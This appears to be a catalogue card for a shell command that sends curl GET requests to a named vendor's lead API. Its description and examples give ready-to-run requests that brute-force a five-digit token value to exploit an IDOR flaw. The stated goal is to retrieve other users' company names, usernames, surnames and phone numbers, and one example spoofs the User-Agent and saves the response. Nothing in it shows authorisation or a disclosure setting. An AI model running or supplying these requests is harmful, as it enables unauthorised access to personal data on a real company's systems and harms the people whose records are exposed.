---
id: cmd-curl-acronis-lead
data: >-
  curl -X GET
  "https://www.acronis.com/en-us/api/v1/lead/id:929-HVV-335&token:_mch-acronis.com-<timestamp>-<integer>"
tags:
  - api
  - request
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:29.027Z'
verified: false
validated: true
submitted: true
---
# curl-acronis-lead-request

## Command

```bash
curl -X GET "https://www.acronis.com/en-us/api/v1/lead/id:929-HVV-335&token:_mch-acronis.com-<timestamp>-<integer>"
```

## Description

This command sends a GET request to the Acronis lead API endpoint using a modified token to test for IDOR access, retrieving user data if the integer is valid.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| URL | Full endpoint with lead ID and token | Yes |
| `<timestamp>` | Fixed from original token | Yes |
| `<integer>` | Variable 5-digit value to brute-force | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.acronis.com/en-us/api/v1/lead/id:929-HVV-335&token:_mch-acronis.com-20231001-39235"
```

### Advanced Usage

```bash
curl -X GET -H "User-Agent: Mozilla/5.0" "https://www.acronis.com/en-us/api/v1/lead/id:929-HVV-335&token:_mch-acronis.com-20231001-76556" -o response.json
```

## Expected Output

Successful response: JSON object with user details like company, username, surname, and phone. Invalid: 404 or error message.

## Related

- [[Related Procedure]]
